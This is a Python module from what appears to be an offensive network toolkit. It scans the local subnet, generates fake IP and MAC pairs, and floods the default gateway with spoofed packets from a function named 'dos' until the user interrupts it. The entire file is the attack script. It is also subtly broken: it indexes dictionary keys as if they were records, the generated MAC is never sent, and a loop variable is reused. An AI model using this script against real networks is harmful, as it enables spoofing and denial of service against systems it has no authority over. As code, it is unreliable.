from scapy.all import *

from mod.basic.scan import atk as scan

from mod.system.system_config.get_ip import get_default_gateway_linux
from mod.system.system_config.mac_gen import mac_maker

def dos(ip, mac, gateway):
    sendp(Ether()/IP(src=ip,dst=gateway))

def gen_new_ip(last_ip):
    ip = last_ip.split(".")

    last_ip_num = ip[len(ip)-1]
    last_ip_num = int(last_ip_num)

    ip.remove(ip[len(ip)-1])

    ip = ".".join(ip)
    ip = ip + "." + str(last_ip_num+1)
    
    return ip

def get_ip_network():
    s = scan(True)
    ip_net = []

    for client in s:
        ip = client['ip']
        ip_net.append(ip)
    
    ip_last = ip_net[len(ip_net)-1]
    return ip_last

def atk():
    ip_last = get_ip_network()
    gateway = get_default_gateway_linux()
    print("[GATEWAY] "+gateway)
    print("[IP TO GEN FROM] "+ip_last)
    
    valid = False
    while not valid:
        try:
            num_ip = int(input("enter the number of ip's to add to network: "))
            valid = True
        except Exception:
            print("[!] int not str")
    
    ip_json = {}
    print("generating new ip's and mac's")
    for i in range(num_ip):
        ip_last = gen_new_ip(ip_last)
        ip_json[i] = {"mac": mac_maker(), "ip": ip_last}
    print("starting ip spoof, hit CTRL+C to stop...")
    
    ip = ip_json[0]['ip']
    mac = ip_json[0]['mac']

    try:
        while True:
            for i in ip_json:
                ip = i['ip']
                mac = i['mac']
                print("sending spoofed ip "+ip+" mac "+str(mac))
                for i in range(10):
                    dos(ip, mac, gateway)
    except KeyboardInterrupt:
        pass
        